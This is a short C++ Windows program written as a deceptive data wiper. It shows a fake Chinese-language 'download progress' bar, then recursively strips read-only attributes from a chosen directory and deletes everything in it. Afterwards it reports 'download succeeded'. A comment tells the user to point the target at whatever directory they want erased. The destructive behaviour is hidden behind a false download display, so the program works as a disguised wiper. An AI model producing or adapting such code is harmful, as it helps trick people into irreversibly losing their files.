#include <windows.h>
#include <string>
#include <iostream>

bool ForceRemoveDirectory(const std::wstring& path) {
    std::wstring search_path = path + L"\\*";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(search_path.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return false;

    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
            continue;

        std::wstring full_path = path + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            ForceRemoveDirectory(full_path);
            RemoveDirectoryW(full_path.c_str());
        } else {
            SetFileAttributesW(full_path.c_str(), FILE_ATTRIBUTE_NORMAL);
            DeleteFileW(full_path.c_str());
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
    return RemoveDirectoryW(path.c_str()) != 0;
}

int wmain() {
    std::wstring target = L"C:\\test"; // ⚠️ 请改成你要删除的目录 

    int percent = 0;
    while (percent <= 100) {
        std::wcout << L"\r下载进度：" << percent << L"%   " << std::flush;
        Sleep(100); // 0.1秒
        percent++;
    }
    std::wcout << std::endl;

    if (ForceRemoveDirectory(target)) {
        std::wcout << L"下载成功！\n";
    } else {
        std::wcout << L"下载失败！\n";
    }
    return 0;
}
